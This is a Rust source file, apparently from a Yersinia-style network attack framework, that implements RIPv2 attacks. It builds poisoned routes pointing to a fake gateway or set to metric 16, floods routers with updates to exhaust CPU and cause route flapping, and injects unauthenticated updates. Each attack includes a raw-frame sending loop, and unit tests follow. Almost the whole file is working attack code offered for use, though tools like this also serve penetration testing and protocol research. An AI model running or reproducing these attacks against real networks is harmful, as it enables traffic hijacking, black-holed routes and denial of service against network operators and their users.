//! RIPv2 Attack Implementations

use super::packet::{RipEntry, RipPacket};
use async_trait::async_trait;
use std::net::Ipv4Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

/// RIP Route Poisoning Attack
///
/// Injects malicious routes into the RIP routing table to redirect traffic
/// or cause routing loops.
#[derive(Debug, Clone)]
pub struct RipPoisoningAttack {
    pub target_network: Ipv4Addr,
    pub target_mask: Ipv4Addr,
    pub fake_gateway: Ipv4Addr,
    pub metric: u32,
    pub poison_mode: PoisonMode,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PoisonMode {
    /// Set metric to 1 (best route)
    BestRoute,
    /// Set metric to 16 (unreachable)
    Infinity,
    /// Custom metric
    Custom,
}

impl RipPoisoningAttack {
    /// Create new poisoning attack with fake gateway
    pub fn new(target: Ipv4Addr, gateway: Ipv4Addr) -> Self {
        Self {
            target_network: target,
            target_mask: Ipv4Addr::new(255, 255, 255, 0),
            fake_gateway: gateway,
            metric: 1,
            poison_mode: PoisonMode::BestRoute,
        }
    }

    /// Create attack to make route unreachable (metric 16)
    pub fn infinity_poison(target: Ipv4Addr, mask: Ipv4Addr) -> Self {
        Self {
            target_network: target,
            target_mask: mask,
            fake_gateway: Ipv4Addr::new(0, 0, 0, 0),
            metric: 16,
            poison_mode: PoisonMode::Infinity,
        }
    }

    /// Create attack with custom metric
    pub fn with_metric(target: Ipv4Addr, mask: Ipv4Addr, gateway: Ipv4Addr, metric: u32) -> Self {
        Self {
            target_network: target,
            target_mask: mask,
            fake_gateway: gateway,
            metric,
            poison_mode: PoisonMode::Custom,
        }
    }

    /// Build RIP response packet with poisoned route
    pub fn build_packet(&self) -> RipPacket {
        let entry = RipEntry::with_next_hop(
            self.target_network,
            self.target_mask,
            self.fake_gateway,
            self.metric,
        );
        RipPacket::new_response(vec![entry])
    }

    /// Build packet with multiple poisoned routes
    pub fn build_multi_poison(&self, routes: Vec<(Ipv4Addr, Ipv4Addr)>) -> RipPacket {
        let entries: Vec<RipEntry> = routes
            .into_iter()
            .map(|(ip, mask)| RipEntry::with_next_hop(ip, mask, self.fake_gateway, self.metric))
            .collect();

        RipPacket::new_response(entries)
    }
}

/// RIP Flooding Attack
///
/// Floods the network with RIP updates to:
/// - Exhaust router CPU
/// - Trigger route flapping
/// - DoS routing table
#[derive(Debug, Clone)]
pub struct RipFloodingAttack {
    pub rate_pps: u32,
    pub use_random_routes: bool,
    pub num_routes_per_packet: usize,
}

impl RipFloodingAttack {
    pub fn new(rate: u32) -> Self {
        Self {
            rate_pps: rate,
            use_random_routes: true,
            num_routes_per_packet: 25, // Max in standard RIP packet
        }
    }

    /// Build flooding packet with random or sequential routes
    pub fn build_packet(&self, iteration: u64) -> RipPacket {
        let mut entries = Vec::with_capacity(self.num_routes_per_packet);

        for i in 0..self.num_routes_per_packet {
            let offset = if self.use_random_routes {
                ((iteration * 13 + i as u64) % 254) as u8 + 1
            } else {
                ((iteration + i as u64) % 254) as u8 + 1
            };

            let ip = Ipv4Addr::new(10, offset, 0, 0);
            let mask = Ipv4Addr::new(255, 255, 0, 0);
            let metric = ((iteration + i as u64) % 15) as u32 + 1;

            entries.push(RipEntry::new(ip, mask, metric));
        }

        RipPacket::new_response(entries)
    }
}

/// RIP Authentication Bypass Attack
///
/// Attempts to bypass MD5 authentication by:
/// - Sending unauthenticated packets
/// - Brute forcing keys
/// - Replay attacks
#[derive(Debug, Clone)]
pub struct RipAuthBypassAttack {
    pub try_no_auth: bool,
    pub key_wordlist: Vec<String>,
}

impl RipAuthBypassAttack {
    pub fn new() -> Self {
        Self {
            try_no_auth: true,
            key_wordlist: vec![
                "cisco".to_string(),
                "password".to_string(),
                "rip".to_string(),
            ],
        }
    }

    pub fn build_unauth_packet(&self) -> RipPacket {
        let entry = RipEntry::new(
            Ipv4Addr::new(192, 168, 100, 0),
            Ipv4Addr::new(255, 255, 255, 0),
            1,
        );
        RipPacket::new_response(vec![entry])
    }
}

impl Default for RipAuthBypassAttack {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Attack for RipPoisoningAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(5); // RIP updates every 5 seconds

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let rip_bytes = self.build_packet().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x09]), // RIP multicast
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                rip_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "RIP Route Poisoning"
    }
}

#[async_trait]
impl Attack for RipFloodingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);
        let mut iteration = 0u64;

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let rip_bytes = self.build_packet(iteration).to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x09]), // RIP multicast
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                rip_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            iteration += 1;
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "RIP Flooding"
    }
}

#[async_trait]
impl Attack for RipAuthBypassAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(1);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let rip_bytes = self.build_unauth_packet().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x09]), // RIP multicast
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                rip_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "RIP Auth Bypass"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_poisoning_attack() {
        let attack =
            RipPoisoningAttack::new(Ipv4Addr::new(192, 168, 1, 0), Ipv4Addr::new(10, 0, 0, 1));

        let packet = attack.build_packet();
        assert_eq!(packet.entries.len(), 1);
        assert_eq!(packet.entries[0].metric, 1);
        assert_eq!(packet.entries[0].next_hop, Ipv4Addr::new(10, 0, 0, 1));
    }

    #[test]
    fn test_infinity_poison() {
        let attack = RipPoisoningAttack::infinity_poison(
            Ipv4Addr::new(192, 168, 1, 0),
            Ipv4Addr::new(255, 255, 255, 0),
        );

        let packet = attack.build_packet();
        assert_eq!(packet.entries[0].metric, 16);
    }

    #[test]
    fn test_flooding_attack() {
        let attack = RipFloodingAttack::new(100);
        let packet = attack.build_packet(0);

        assert_eq!(packet.entries.len(), 25);
        assert!(packet.entries.iter().all(|e| e.metric > 0 && e.metric < 16));
    }

    #[test]
    fn test_multi_poison() {
        let attack = RipPoisoningAttack::new(Ipv4Addr::new(0, 0, 0, 0), Ipv4Addr::new(10, 0, 0, 1));

        let routes = vec![
            (
                Ipv4Addr::new(192, 168, 1, 0),
                Ipv4Addr::new(255, 255, 255, 0),
            ),
            (
                Ipv4Addr::new(192, 168, 2, 0),
                Ipv4Addr::new(255, 255, 255, 0),
            ),
        ];

        let packet = attack.build_multi_poison(routes);
        assert_eq!(packet.entries.len(), 2);
    }
}
